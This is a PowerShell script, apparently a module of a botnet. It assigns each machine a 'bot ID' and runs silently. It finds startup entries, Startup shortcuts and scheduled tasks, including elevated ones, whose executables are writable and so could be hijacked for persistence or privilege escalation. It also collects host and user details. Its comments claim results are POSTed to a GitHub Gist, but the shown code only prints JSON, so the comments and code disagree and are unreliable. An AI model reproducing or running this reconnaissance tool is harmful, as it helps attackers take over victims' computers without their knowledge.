# Runs hidden, no disk writes, no window
# Scans startup locations for writable elevated binaries
# POSTs results to GitHub Gist

$ErrorActionPreference = 'SilentlyContinue'

# Bot ID — stable, unique per machine, safe for Gist filenames
$botId = ($env:COMPUTERNAME + '_' + $env:USERNAME) -replace '[^A-Za-z0-9_-]', ''

function Get-ExePath($cmd) {
    if (-not $cmd) { return $null }
    $cmd = $cmd.Trim()
    if ($cmd -match '^"([^"]+\.exe)"') { return $matches[1] }
    if ($cmd -match '^([A-Za-z]:\\[^\s]+\.exe)') { return $matches[1] }
    $tok = ($cmd -split '\s+')[0]
    if ($tok -match '\.exe$') { return $tok }
    return $null
}

function Test-Writable($path) {
    if (-not $path) { return $false }
    if (-not [IO.File]::Exists($path)) { return $false }
    try {
        $h = [IO.File]::Open($path,[IO.FileMode]::Open,[IO.FileAccess]::ReadWrite,[IO.FileShare]::ReadWrite)
        $h.Close()
        return $true
    } catch { return $false }
}

$candidates = [System.Collections.Generic.List[hashtable]]::new()

# ── Source 1: Registry Run keys ───────────────────────────────────────────────
$runKeys = @(
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
)
foreach ($key in $runKeys) {
    $props = Get-ItemProperty $key
    if (-not $props) { continue }
    $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
        $p = Get-ExePath $_.Value
        if ($p -and (Test-Writable $p)) {
            $fi = [IO.FileInfo]::new($p)
            $candidates.Add(@{
                src  = 'RunKey'
                key  = ($key -replace 'HKCU:|HKLM:','')
                name = $_.Name
                path = $p
                size = $fi.Length
                elev = $false
            })
        }
    }
}

# ── Source 2: Startup folder shortcuts ────────────────────────────────────────
$startupDirs = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
)
$wsh = New-Object -ComObject WScript.Shell
foreach ($dir in $startupDirs) {
    if (-not [IO.Directory]::Exists($dir)) { continue }
    Get-ChildItem $dir -Filter '*.lnk' | ForEach-Object {
        try {
            $target = $wsh.CreateShortcut($_.FullName).TargetPath
            if ($target -and (Test-Writable $target)) {
                $fi = [IO.FileInfo]::new($target)
                $candidates.Add(@{
                    src  = 'StartupLnk'
                    key  = $dir
                    name = $_.Name
                    path = $target
                    size = $fi.Length
                    elev = $false
                })
            }
        } catch {}
    }
}

# ── Source 3: Scheduled tasks (all non-disabled) ──────────────────────────────
Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | ForEach-Object {
    $taskName = $_.TaskName
    $elevated = ($_.Principal.RunLevel -eq 'Highest')
    $_.Actions | ForEach-Object {
        $p = Get-ExePath $_.Execute
        if ($p -and (Test-Writable $p)) {
            $fi = [IO.FileInfo]::new($p)
            $candidates.Add(@{
                src  = 'SchedTask'
                key  = $taskName
                name = $taskName
                path = $p
                size = $fi.Length
                elev = $elevated
            })
        }
    }
}

# ── Deduplicate by path ────────────────────────────────────────────────────────
$seen  = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
$dedup = $candidates | Where-Object { $seen.Add($_.path) }

# ── Collect basic host info ────────────────────────────────────────────────────
$meta = @{
    host = $env:COMPUTERNAME
    user = $env:USERNAME
    os   = (Get-CimInstance Win32_OperatingSystem).Caption
    ts   = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
}

# ── Serialize (three separate Gist files) ─────────────────────────────────────
$dataJson = @{ hits = @($dedup) } | ConvertTo-Json -Compress -Depth 4
$metaJson = $meta | ConvertTo-Json -Compress

# ── Return results to caller via stdout ───────────────────────────────────────
[ordered]@{
    data = @{ hits = @($dedup) }
    meta = $meta
    bot  = $botId
} | ConvertTo-Json -Compress -Depth 4
